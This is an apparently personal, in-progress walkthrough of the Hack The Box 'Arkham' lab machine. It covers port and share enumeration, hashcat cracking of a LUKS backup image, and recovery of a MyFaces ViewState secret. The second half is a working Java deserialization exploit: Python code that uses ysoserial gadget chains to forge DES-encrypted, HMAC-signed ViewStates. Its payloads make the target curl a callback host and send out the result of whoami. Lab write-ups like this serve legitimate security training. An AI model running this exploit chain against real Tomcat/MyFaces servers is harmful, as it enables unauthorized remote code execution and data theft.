# Arkham (In progress)
- Target IP: 10.129.228.116

# Recon
```bash
nmap -iL scope.txt -p- -oA Nmap/All --open -Pn

# 80,135,139,445,8080,49666,49667
```

```bash
nmap -iL scope.txt -p80 -sCV -oA Nmap/sCV-80 --open -Pn

# Output
# Microsoft-IIS/10.0
```

```bash
nmap -iL scope.txt -p135 -sCV -oA Nmap/sCV-135 --open -Pn

# Output
# Microsoft Windows RPC
```

```bash
nmap -iL scope.txt -p139 -sCV -oA Nmap/sCV-139 --open -Pn

# Output
# Microsoft Windows netbios-ssn
```

```bash
nmap -iL scope.txt -p445 -sCV -oA Nmap/sCV-445 --open -Pn

# Output
# smb2-security-mode: 
# |   3:1:1: 
# |_    Message signing enabled but not required
```

```bash
nmap -iL scope.txt -p8080 -sCV -oA Nmap/sCV-8080 --open -Pn

# Output
# Apache Tomcat 8.5.37
# _http-title: Mask Inc.
# | http-methods: 
# |_  Potentially risky methods: PUT DELETE
```

```bash
nmap -iL scope.txt -p49666 -sCV -oA Nmap/sCV-49666 --open -Pn

# Output
# Microsoft Windows RPC
```

```bash
nmap -iL scope.txt -p49667 -sCV -oA Nmap/sCV-49667 --open -Pn

# Output
# Microsoft Windows RPC
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 25 --url http://10.129.228.116/

# Output
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -t 25 --url http://10.129.228.116/

# Output
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 25 --url http://10.129.228.116:8080/

# Output
# /css                  (Status: 302) [Size: 0] [--> /css/]
# /js                   (Status: 302) [Size: 0] [--> /js/]
# /images               (Status: 302) [Size: 0] [--> /images/]
# /fonts                (Status: 302) [Size: 0] [--> /fonts/]
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -t 25 --url http://10.129.228.116:8080/

# Output
# /css                  (Status: 302) [Size: 0] [--> /css/]
# /fonts                (Status: 302) [Size: 0] [--> /fonts/]
# /images               (Status: 302) [Size: 0] [--> /images/]
# /index.html           (Status: 200) [Size: 11382]
# /js                   (Status: 302) [Size: 0] [--> /js/]
```

# SMB Enumeration

```bash
nxc smb 10.129.228.116 -u '' -p '' --shares
SMB         10.129.228.116  445    ARKHAM           [*] Windows 10 / Server 2019 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)
SMB         10.129.228.116  445    ARKHAM           [+] ARKHAM\: 
SMB         10.129.228.116  445    ARKHAM           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```bash
nxc smb 10.129.228.116 -u 'Guest' -p '' --shares
SMB         10.129.228.116  445    ARKHAM           [*] Windows 10 / Server 2019 Build 17763 x64 (name:ARKHAM) (domain:ARKHAM) (signing:False) (SMBv1:False)
SMB         10.129.228.116  445    ARKHAM           [+] ARKHAM\Guest: 
SMB         10.129.228.116  445    ARKHAM           [*] Enumerated shares
SMB         10.129.228.116  445    ARKHAM           Share           Permissions     Remark
SMB         10.129.228.116  445    ARKHAM           -----           -----------     ------
SMB         10.129.228.116  445    ARKHAM           ADMIN$                          Remote Admin
SMB         10.129.228.116  445    ARKHAM           BatShare        READ            Master Wayne's secrets
SMB         10.129.228.116  445    ARKHAM           C$                              Default share
SMB         10.129.228.116  445    ARKHAM           IPC$            READ            Remote IPC
SMB         10.129.228.116  445    ARKHAM           Users           READ          
```

```bash
smbclient \\\\10.129.228.116\\Users -U 'Guest'
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sun Feb  3 07:24:10 2019
  ..                                 DR        0  Sun Feb  3 07:24:10 2019
  Default                           DHR        0  Thu Jan 31 20:49:06 2019
  desktop.ini                       AHS      174  Sat Sep 15 02:16:48 2018
  Guest                               D        0  Sun Feb  3 07:24:19 2019

smb: \> dir Guest
  Guest                               D        0  Sun Feb  3 07:24:19 2019
```

```bash
smbclient \\\\10.129.228.116\\Batshare -U 'Guest'
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb  3 07:00:10 2019
  ..                                  D        0  Sun Feb  3 07:00:10 2019
  appserver.zip                       A  4046695  Fri Feb  1 00:13:37 2019

smb: \> get appserver.zip
getting file \appserver.zip of size 4046695 as appserver.zip (3087.4 KiloBytes/sec) (average 3087.4 KiloBytes/sec)
```

```bash
unzip appserver.zip 
Archive:  appserver.zip
  inflating: IMPORTANT.txt           
  inflating: backup.img
```

```bash
cat IMPORTANT.txt 
Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce 
```

```bash
file backup.img 
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e, at 0x1000 data, 32 key bytes, MK digest 0x9a35ab3db2fe09d65a92bd015035a6abdcea0147, MK salt 0x36e88d002fb03c1fde4d9d7ba69c59257ae71dd7893d9cabefb6098ca87b8713, 176409 MK iterations; slot #0 active, 0x8 material offset
```

- https://www.forensicfocus.com/articles/bruteforcing-linux-full-disk-encryption-luks-with-hashcat/

```bash
cat /usr/share/wordlists/seclists/Passwords/*.txt | grep -iE '(batman|gotham|arkham)' | sort -u > batman_wordlist.txt
```

```bash
hashcat -m 14600 -a 0 -w 3 backup.img batman_wordlist.txt -o luks_password.txt

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 14600 (LUKS v1 (legacy))
Hash.Target......: backup.img
Time.Started.....: Fri Dec  5 04:47:01 2025 (1 min, 44 secs)
Time.Estimated...: Fri Dec  5 04:48:45 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (../batman_wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:       19 H/s (37.00ms) @ Accel:512 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1930/1930 (100.00%)
Rejected.........: 0/1930 (0.00%)
Restore.Point....: 0/1930 (0.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:2822144-2822545
Candidate.Engine.: Device Generator
Candidates.#2....: 0007batman -> zliy_batman

Started: Fri Dec  5 04:47:00 2025
Stopped: Fri Dec  5 04:48:46 2025

┌─[romanrii☺htb-u34ecjf78c]─[~/10.129.228.116/Analysis]
└──╼ $cat luks_password.txt 
backup.img:batmanforever
```

```bash
sudo cryptsetup open --type luks backup.img Decrypted_img
Enter passphrase for backup.img:

ls -la /dev/mapper/
total 0
drwxr-xr-x  2 root root      80 Dec  5 04:53 .
drwxr-xr-x 18 root root    3360 Dec  5 04:53 ..
crw-------  1 root root 10, 236 Dec  5 03:45 control
lrwxrwxrwx  1 root root       7 Dec  5 04:53 Decrypted_img -> ../dm-0
```

```bash
┌─[romanrii☺htb-u34ecjf78c]─[~/10.129.228.116/Analysis]
└──╼ $sudo mkdir /mnt/arkham_img
┌─[romanrii☺htb-u34ecjf78c]─[~/10.129.228.116/Analysis]
└──╼ $sudo mount /dev/mapper/Decrypted_img /mnt/arkham_img/
```

```bash
┌─[romanrii☺htb-u34ecjf78c]─[/mnt/arkham_img]
└──╼ $ls -la
total 18
drwxr-xr-x 4 root root  1024 Dec 25  2018 .
drwxr-xr-x 3 root root  4096 Dec  5 04:54 ..
drwx------ 2 root root 12288 Dec 24  2018 lost+found
drwxrwxr-x 4 root root  1024 Dec 24  2018 Mask
```

```bash
┌─[romanrii☺htb-u34ecjf78c]─[/mnt/arkham_img/Mask]
└──╼ $ls -la
total 882
drwxrwxr-x 4 root root   1024 Dec 24  2018 .
drwxr-xr-x 4 root root   1024 Dec 25  2018 ..
drwxr-xr-x 2 root root   1024 Dec 24  2018 docs
-rw-rw-r-- 1 root root  96978 Dec 24  2018 joker.png
-rw-rw-r-- 1 root root 105374 Dec 24  2018 me.jpg
-rw-rw-r-- 1 root root 687160 Dec 24  2018 mycar.jpg
-rw-rw-r-- 1 root root   7586 Dec 24  2018 robin.jpeg
drwxr-xr-x 2 root root   1024 Dec 24  2018 tomcat-stuff
```

```bash
┌─[romanrii☺htb-u34ecjf78c]─[/mnt/arkham_img/Mask/tomcat-stuff]
└──╼ $ls -la
total 193
drwxr-xr-x 2 root root   1024 Dec 24  2018 .
drwxrwxr-x 4 root root   1024 Dec 24  2018 ..
-rw-r--r-- 1 root root   1368 Dec 24  2018 context.xml
-rw-r--r-- 1 root root    832 Dec 24  2018 faces-config.xml
-rw-r--r-- 1 root root   1172 Dec 24  2018 jaspic-providers.xml
-rw-r--r-- 1 root root     39 Dec 24  2018 MANIFEST.MF
-rw-r--r-- 1 root root   7678 Dec 24  2018 server.xml
-rw-r--r-- 1 root root   2208 Dec 24  2018 tomcat-users.xml
-rw-r--r-- 1 root root 174021 Dec 24  2018 web.xml
-rw-r--r-- 1 root root   3498 Dec 24  2018 web.xml.bak
```

```bash
grep -iE '(pass|key|secret)' * | grep -v '!'
server.xml:            <Certificate certificateKeystoreFile="conf/localhost-rsa.jks"
server.xml:            <Certificate certificateKeyFile="conf/localhost-rsa-key.pem"
server.xml:         analyzes the HTTP headers included with the request, and passes them
server.xml:             resources under the key "UserDatabase".  Any edits
tomcat-users.xml:  you must define such a user - the username and password are arbitrary. It is
tomcat-users.xml:  them. You will also need to set the passwords to something appropriate.
tomcat-users.xml:  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
tomcat-users.xml:  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
tomcat-users.xml:  <user username="role1" password="<must-be-changed>" roles="role1"/>
web.xml:        <extension>cdkey</extension>
web.xml:        <mime-type>application/vnd.mediastation.cdkey</mime-type>
web.xml:        <mime-type>application/vnd.crick.clicker.keyboard</mime-type>
web.xml:        <mime-type>application/vnd.ds-keypoint</mime-type>
web.xml:        <mime-type>application/vnd.blueice.multipass</mime-type>
web.xml.bak:<param-name>org.apache.myfaces.SECRET</param-name>
web.xml.bak:<param-name>org.apache.myfaces.MAC_SECRET</param-name>
```

```
<param-name>org.apache.myfaces.SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
    <context-param>
        <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
        <param-value>HmacSHA1</param-value>
     </context-param>
<context-param>
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
```
- MAC: `HmacSHA1`
- Secret: `SnNGOTg3Ni0=` -> `JsF9876-`

# HTTP (8080 Enumeration)
- Main page has a link to http://10.129.228.116:8080/userSubscribe.faces

```
POST /userSubscribe.faces HTTP/1.1
Host: 10.129.228.116:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.228.116:8080/userSubscribe.faces
Content-Type: application/x-www-form-urlencoded
Content-Length: 270
Origin: http://10.129.228.116:8080
DNT: 1
Connection: keep-alive
Cookie: JSESSIONID=914E80B16E0FA26DA644ADFD2CD5C70C
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

j_id_jsp_1623871077_1%3Aemail=email%40email.com&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
```

```
wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=
```

- We can decrypt/encrypt viewstates with the secret key
- When we craft our own requests and send it to the server, we will need to sign the requests.

- https://cwiki.apache.org/confluence/pages/viewpage.action?pageId=120732140#SecureYourApplication-SecurityconfigurationforMyfacesCore1.1.7,1.2.8,2.0.0andearlier
```
Enabling encryption is as easy as putting the following context parameter in your deployment descriptor.
There are two things to note here.
First, this uses the default encryption algorithm, DES, so the secret must have a size of eight.
```

- Our key is 8 characters, so we can try DES

```python
import base64
from Crypto.Cipher import DES

key = base64.b64decode('SnNGOTg3Ni0=')
raw = base64.b64decode('wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=')

# Split into ciphertext and MAC (last 20 bytes is HMAC-SHA1)
ciphertext = raw[:-20]
mac = raw[-20:]

# Sanity check alignment
if len(ciphertext) % 8 != 0:
    raise ValueError(f"Ciphertext length {len(ciphertext)} is not a multiple of DES block size")

des = DES.new(key, DES.MODE_ECB)
plaintext_padded = des.decrypt(ciphertext)

# PKCS#5/PKCS#7 unpadding
pad_len = plaintext_padded[-1]
if pad_len < 1 or pad_len > 8 or plaintext_padded[-pad_len:] != bytes([pad_len]) * pad_len:
    raise ValueError("Invalid padding")

plaintext = plaintext_padded[:-pad_len]

print(plaintext)
```

- Successful decrtyption

```python
import base64
import hmac
import hashlib

from Crypto.Cipher import DES


class Payload:
    def __init__(self, key_b64: str):
        # Expect base64-encoded DES key
        self.key = base64.b64decode(key_b64)
        self.mac_alg = getattr(hashlib, "sha1")
        if len(self.key) != 8:
            raise ValueError(f"DES key must be 8 bytes, got {len(self.key)}")
        self.block_size = 8
        self.cipher = DES.new(self.key, DES.MODE_ECB)

    def _pad(self, data: bytes) -> bytes:
        pad_len = self.block_size - (len(data) % self.block_size)
        return data + bytes([pad_len]) * pad_len

    def _unpad(self, data: bytes) -> bytes:
        if not data:
            raise ValueError("Cannot unpad empty data")
        pad_len = data[-1]
        if pad_len < 1 or pad_len > self.block_size:
            raise ValueError("Invalid padding length")
        if data[-pad_len:] != bytes([pad_len]) * pad_len:
            raise ValueError("Invalid PKCS#5/PKCS#7 padding")
        return data[:-pad_len]

    def _sign(self, ciphertext: bytes) -> bytes:
        return hmac.new(self.key, ciphertext, self.mac_alg).digest()

    def encrypt(self, plaintext: bytes) -> bytes:
        padded = self._pad(plaintext)
        ciphertext = self.cipher.encrypt(padded)
        mac = self._sign(ciphertext)
        return ciphertext + mac

    def decrypt(self, ciphertext: bytes) -> bytes:
        if len(ciphertext) % self.block_size != 0:
            raise ValueError("Ciphertext must be a multiple of block size")
        padded = self.cipher.decrypt(ciphertext)
        return self._unpad(padded)


if __name__ == "__main__":
    key_b64 = 'SnNGOTg3Ni0='
    raw = base64.b64decode('wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=')

    # Split into ciphertext and MAC (last 20 bytes is HMAC-SHA1)
    ciphertext = raw[:-20]
    mac = raw[-20:]

    if len(ciphertext) % 8 != 0:
        raise ValueError(f"Ciphertext length {len(ciphertext)} is not a multiple of DES block size")

    payload = Payload(key_b64)

    # Decrypt
    plaintext = payload.decrypt(ciphertext)
    #print(plaintext)

    # Test re-encrypt
    ciphertest_test = payload.encrypt(plaintext)
    print(f"1: {base64.b64encode(ciphertest_test).decode()} \n2: {base64.b64encode(raw).decode()}")
```

```
python3 decrypt.py

1: wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=
2: wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=
```

# JavaFaces Serialization Attack
- Payload gen tool: https://github.com/frohoff/ysoserial

```bash
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED -jar ./ysoserial-all.jar CommonsCollections1 'ping -c 1 10.10.14.64
```

- Final working exploit
```python
import hmac
import base64
import hashlib
import requests
import subprocess

from Crypto.Cipher import DES


class Payload:
    def __init__(self, key_b64: str):
        # Expect base64-encoded DES key
        self.key = base64.b64decode(key_b64)
        self.mac_alg = getattr(hashlib, "sha1")
        if len(self.key) != 8:
            raise ValueError(f"DES key must be 8 bytes, got {len(self.key)}")
        self.block_size = 8
        self.cipher = DES.new(self.key, DES.MODE_ECB)

    def _pad(self, data: bytes) -> bytes:
        pad_len = (self.block_size - (len(data) % self.block_size)) % self.block_size
        if pad_len == 0:
            return data
        return data + bytes([pad_len]) * pad_len

    def _unpad(self, data: bytes) -> bytes:
        if not data:
            raise ValueError("Cannot unpad empty data")
        pad_len = data[-1]
        if pad_len < 1 or pad_len > self.block_size:
            raise ValueError("Invalid padding length")
        if data[-pad_len:] != bytes([pad_len]) * pad_len:
            raise ValueError("Invalid PKCS#5/PKCS#7 padding")
        return data[:-pad_len]

    def _sign(self, ciphertext: bytes) -> bytes:
        return hmac.new(self.key, ciphertext, self.mac_alg).digest()

    def encrypt(self, plaintext: bytes) -> bytes:
        padded = self._pad(plaintext)
        ciphertext = self.cipher.encrypt(padded)
        mac = self._sign(ciphertext)
        return ciphertext + mac

    def decrypt(self, ciphertext: bytes) -> bytes:
        if len(ciphertext) % self.block_size != 0:
            raise ValueError("Ciphertext must be a multiple of block size")
        padded = self.cipher.decrypt(ciphertext)
        return self._unpad(padded)


def prepare_payload(collection: str, command: str):
    payload_generation_command = [
        "/usr/lib/jvm/java-11-openjdk-amd64/bin/java",
        "-jar",
        "/opt/ysoserial.jar",
        collection,
        command
    ]
    serialized_payload = subprocess.check_output(payload_generation_command)
    key_b64 = "SnNGOTg3Ni0="
    payload = Payload(key_b64)
    return base64.b64encode(payload.encrypt(serialized_payload))


if __name__ == "__main__":
    payload_collections = [
        "BeanShell1",
        "CommonsBeanutils1",
        "CommonsCollections1",
        "CommonsCollections2",
        "CommonsCollections3",
        "CommonsCollections4",
        "CommonsCollections5",
        "CommonsCollections6",
        "CommonsCollections7",
        "Myfaces1",
        "Spring1",
        "Spring2"
    ]

    host = "http://10.129.228.116:8080"
    callback_host = "http://10.10.14.64:443"
    prepared_payloads: dict[str, bytes] = {}

    for collection in payload_collections:
        command = f"curl {callback_host}/{collection}"
        prepared_payloads[collection] = prepare_payload(collection=collection, command=command)

    for collection, payload in prepared_payloads.items():
        session = requests.session()
        session.get(f"{host}/userSubscribe.faces")
        data = {
            "j_id_jsp_1623871077_1%3Aemail": "email@email.com",
            "j_id_jsp_1623871077_1%3Asubmit": "SIGN+UP",
            "j_id_jsp_1623871077_1_SUBMIT": "1",
            "javax.faces.ViewState": payload.decode()
        }
        response = session.post(
            f"{host}/userSubscribe.faces",
            data=data
        )
```

```
10.129.228.116 - - [05/Dec/2025 07:34:55] "GET /CommonsCollections5 HTTP/1.1" 404 -
10.129.228.116 - - [05/Dec/2025 07:34:56] "GET /CommonsCollections7 HTTP/1.1" 404 -
```

- CommonsCollections5 and CommonsCollections7 work in this case

```python
callback_command = f"powershell curl http://{callback_host}:{callback_port}/$(whoami)" 

# 10.129.228.116 - - [05/Dec/2025 07:54:29] "GET /arkham/alfred HTTP/1.1" 404 -
```
